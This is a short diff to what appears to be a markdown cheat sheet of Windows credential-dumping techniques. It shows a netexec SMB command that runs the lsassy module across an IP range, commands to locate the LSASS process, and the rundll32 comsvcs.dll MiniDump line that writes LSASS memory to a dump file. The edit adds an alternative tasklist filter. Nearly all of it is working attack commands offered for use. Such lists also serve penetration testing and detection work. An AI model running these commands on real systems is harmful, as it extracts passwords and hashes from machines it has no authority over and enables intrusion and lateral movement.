@@ -32,9 +32,13 @@
 
  - netexec smb IP_RANGE -u USER -p 'PASSWORD' -M lsassy
 
-#### 7) rundll32.exe
+#### 7) rundll32.exe (comsvcs.dll)
 
- - tasklist | findstr lsass
+ - tasklist | findstr lsass 
+
+OR
+
+ - tasklist /fi "Imagename eq lsass.exe"
 
  - C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump LSASS_PID C:\temp\LSASS.dmp
 
